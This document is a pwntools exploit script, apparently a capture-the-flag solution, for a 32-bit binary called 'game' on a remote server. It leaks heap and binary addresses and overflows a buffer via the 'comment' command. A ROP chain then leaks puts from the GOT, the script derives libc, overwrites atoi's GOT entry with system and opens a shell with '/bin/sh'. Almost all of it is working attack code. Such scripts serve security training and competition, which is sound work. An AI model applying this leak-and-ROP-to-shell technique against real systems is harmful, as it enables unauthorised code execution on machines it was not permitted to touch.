from pwn import *

context.log_level='debug'

#REMOTE = False
REMOTE = True

e = ELF('./game')
if REMOTE:
	io = remote('123.56.81.227',4545)
	libc = ELF('../libc32.so')
else:
	io = process('./game')
	libc = e.libc



io.recvuntil('name?')
io.send('A'*0x20)

io.recvuntil('$')
io.sendline('build_warehouse')
io.recvuntil('have?\n')
io.sendline('100')


for i in range(10):
	io.recvuntil('$')
	io.sendline('buy_weapon')
	io.recvuntil('buy?\n')
	io.sendline('M4A1')         # M4A1 9A91-S UMP45
	io.recvuntil('weapon?\n')
	io.sendline(str(i))


def attack_boss(i):
	io.recvuntil('$')
	io.sendline('attack_boss')
	io.recvuntil('warehouse\n')
	io.sendline(str(i))


def comment(s):
	io.recvuntil('$')
	io.sendline('comment')
	io.recvuntil('game?\n')
	io.sendline(s)

for i in range(5):
	attack_boss(4)

io.recvuntil('$')
io.sendline('show')
io.recvuntil('A'*0x20)
heap_addr = u32(io.recv(4)) 
show_addr = u32(io.recv(4))

e.address = show_addr - 0xcb9
log.success('base:%#x'% e.address)

# ware_house_ptr 0xf7c9b008
# 0xf7c9b1d0 first weapon
# 0xf7c9b1d0 + 0x10 weapon func

# f7753cb9 -> 00CB9 show
# f7754287 -> 1287

'''
.text:00000A0F                 sub     esp, 8
.text:00000A12                 push    20h
.text:00000A14                 lea     eax, [ebp+src]
.text:00000A17                 push    eax
.text:00000A18                 call    read_bytes
.text:00000A1D                 add     esp, 10h
.text:00000A20                 mov     [ebp+var_1C], eax
'''

overflow_bytes = e.address+ 0x0A14
payload = 'A'*16 + p32(overflow_bytes)
payload += p32(0) + p32(100) + p32(100)

comment(payload)

log.success('overflow_bytes:%#x'% (overflow_bytes ))

#gdb.attach(io, 'b *%#x'% (e.address + 0x00D81))

attack_boss(4)
'''
0x00000a4a : pop ebp ; ret
0x00000a49 : pop edi ; pop ebp ; ret
0x00000cb6 : pop esi ; pop ebp ; ret
0x00000a48 : pop esi ; pop edi ; pop ebp ; ret
'''
read_bytes = e.address + 0x0B62  
popret = e.address + 0x00000a4a
pop2ret = e.address + 0x00000cb6 
weapon_func = e.address + 0x01287 
build_func = e.address + 0x00D11  

rop = 'A'*(0x3D+4)
rop += p32(weapon_func) + p32(popret) + p32(e.got['puts'])
rop += p32(read_bytes) + p32(pop2ret) + p32(e.got['atoi']) + p32(4)
rop += p32(build_func)
io.sendline(rop)

io.recvuntil('using ')
puts_addr = u32(io.recv(4))
log.success("puts:%#x"% puts_addr)
#raw_input('pause')
libc.address = puts_addr - libc.symbols['puts']
sys_addr = libc.symbols['system']

log.success("sys:%#x"% sys_addr)

io.recv()
io.send(p32(sys_addr))
io.recv()
io.sendline('/bin/sh')

io.interactive()